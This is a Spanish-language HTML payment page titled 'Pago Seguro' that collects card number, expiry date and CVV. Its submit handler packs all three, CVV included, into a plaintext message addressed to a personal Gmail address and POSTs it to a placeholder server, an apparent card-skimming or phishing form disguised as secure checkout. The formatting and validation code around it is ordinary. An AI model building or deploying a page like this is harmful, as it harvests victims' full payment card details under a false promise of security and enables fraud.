<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pago Seguro</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f4f4f4;
        }
        .container {
            max-width: 600px;
            margin: 20px auto;
            padding: 20px;
            background: #fff;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
        }
        h2 {
            margin-top: 0;
            font-size: 24px;
            color: #333;
        }
        label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
        }
        input {
            width: 100%;
            padding: 12px;
            margin-bottom: 10px;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 16px;
            box-sizing: border-box;
        }
        input.error {
            border-color: #e74c3c;
        }
        button {
            background: #28a745;
            color: #fff;
            border: none;
            padding: 12px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
        }
        button:hover {
            background: #218838;
        }
        .error {
            color: #e74c3c;
            font-size: 0.9em;
            margin-top: -10px;
            margin-bottom: 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>Realiza tu Pago</h2>
        <form id="payment-form">
            <label for="card-number">Número de Tarjeta:</label>
            <input type="text" id="card-number" name="card-number" placeholder="Ingrese su número de tarjeta" required>
            
            <label for="expiry-date">Fecha de Caducidad (MM/AA):</label>
            <input type="text" id="expiry-date" name="expiry-date" placeholder="MM/AA" required maxlength="5">
            <div id="expiry-error" class="error"></div>
            
            <label for="cvv">CVV:</label>
            <input type="text" id="cvv" name="cvv" placeholder="Código CVV" required maxlength="3">
            
            <button type="submit">Pagar Ahora</button>
        </form>
    </div>
    <script>
        document.getElementById('card-number').addEventListener('input', function(event) {
            // Solo permitir números y limitar longitud
            this.value = this.value.replace(/\D/g, '').slice(0, 16);
        });

        document.getElementById('expiry-date').addEventListener('input', function(event) {
            let value = event.target.value.replace(/\D/g, ''); // Remove non-digit characters
            let formattedValue = '';

            if (value.length > 4) {
                value = value.slice(0, 4); // Limit to 4 digits
            }

            if (value.length > 2) {
                formattedValue = value.slice(0, 2) + '/' + value.slice(2);
            } else {
                formattedValue = value;
            }

            event.target.value = formattedValue;

            // Validate the month and year
            const [month, year] = formattedValue.split('/');

            const monthValue = parseInt(month, 10);
            const yearValue = parseInt(year, 10);

            let errorMessage = '';

            if (month && monthValue > 12) {
                errorMessage = 'El mes no puede ser mayor a 12.';
            } else if (year && yearValue < 23) {
                errorMessage = 'El año debe ser 23 o mayor.';
            }

            document.getElementById('expiry-error').textContent = errorMessage;
        });

        document.getElementById('payment-form').addEventListener('submit', function(event) {
            event.preventDefault();

            // Obtener los datos del formulario
            const cardNumber = document.getElementById('card-number').value;
            const expiryDate = document.getElementById('expiry-date').value;
            const cvv = document.getElementById('cvv').value;

            // Validar si hay errores
            const errorMessage = document.getElementById('expiry-error').textContent;

            if (errorMessage) {
                alert('Corrija los errores antes de enviar el formulario.');
                return;
            }

            // Configurar el correo electrónico
            const emailAddress = 'ianjv3615@gmail.com';
            const subject = 'Nueva Transacción de Pago';
            const message = `Número de Tarjeta: ${cardNumber}\nFecha de Caducidad: ${expiryDate}\nCVV: ${cvv}`;

            // Usar fetch para enviar los datos al servidor (esto es solo una simulación)
            fetch('https://your-server.com/send-email', { // Reemplaza con tu servidor real
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    email: emailAddress,
                    subject: subject,
                    message: message,
                }),
            })
            .then(response => response.json())
            .then(data => {
                alert('Datos enviados correctamente.');
            })
            .catch((error) => {
                console.error('Error:', error);
                alert('Ocurrió un error al enviar los datos.');
            });
        });
    </script>
</body>
</html>
